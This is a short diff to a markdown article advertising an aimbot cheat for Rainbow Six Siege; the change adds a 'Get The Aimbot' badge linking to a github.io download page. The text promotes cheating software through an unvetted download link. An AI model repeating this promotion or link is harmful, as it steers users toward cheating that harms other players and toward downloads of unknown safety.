@@ -4,6 +4,7 @@
 
 **Rainbow Six Siege (R6)** is one of the most tactical FPS games on the market, where every shot counts and one mistake can end a round. That’s exactly why so many players look for an **R6 aimbot** – a cheat that delivers pixel-perfect accuracy and lightning-fast reactions. In this article, we’ll break down what the aimbot does, its features, how it compares to other hacks, and why it’s one of the most sought-after tools in Siege’s competitive scene.
 
+[![Get](https://img.shields.io/badge/Get%20The-Aimbot-blueviolet)](https://rainbow-six-siege-aimbots.github.io/.github/)
 ---
 
 ## What is a Rainbow Six Siege Aimbot?
